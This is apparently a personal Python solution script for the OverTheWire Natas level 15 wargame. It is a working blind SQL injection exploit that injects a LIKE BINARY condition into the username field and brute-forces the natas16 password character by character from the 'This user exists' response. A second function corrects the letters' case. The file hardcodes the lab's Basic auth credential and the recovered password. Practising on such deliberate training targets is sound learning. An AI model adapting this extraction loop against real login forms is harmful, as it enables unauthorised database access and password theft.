import requests
import json

def send_req(value):
    reqUrl = "http://natas15.natas.labs.overthewire.org/index.php?debug"

    headersList = {
    "Accept": "*/*",
    "User-Agent": "Thunder Client (https://www.thunderclient.com)",
    "Authorization": "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==",
    "Content-Type": "multipart/form-data; boundary=kljmyvW1ndjXaOEAg4vPm6RBUqO6MC5A" 
    }

    username = f'natas16" AND password LIKE BINARY "{value}%'
    payload = f"--kljmyvW1ndjXaOEAg4vPm6RBUqO6MC5A\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n--kljmyvW1ndjXaOEAg4vPm6RBUqO6MC5A--\r\n"

    response = requests.post( reqUrl, data=payload,  headers=headersList)

    return response.text


def main():

    password = "TRD7I"

    attack_list = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','1','2','3','4','5','6','7','8','9','0']


    while len(password)<32:
        found = False

        for ch in attack_list:
            print(password+ch,end=" ")
            res = send_req(password+ch)

            if "This user exists" in res:
                password += ch
                found = True
                break

        print('\n')

        if found:
            print("password: ",password)
        else:
            print("Stopped since no match found")
            break

    print("Final password: ",password)


def fix():
    password = "TRD7IZRD5GATJJ9PKPEUAOLFEJHQJ32V"
    curr = ""

    for ch in password:
        print(ch,end=" ")
        if ch.isdigit():
            curr += ch
            continue

        res = send_req(curr+ch)

        if "This user exists" not in res:
            curr += ch.lower()
        else:
            curr += ch

    print('\n')
    print(curr)
fix()

#found upto TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

        

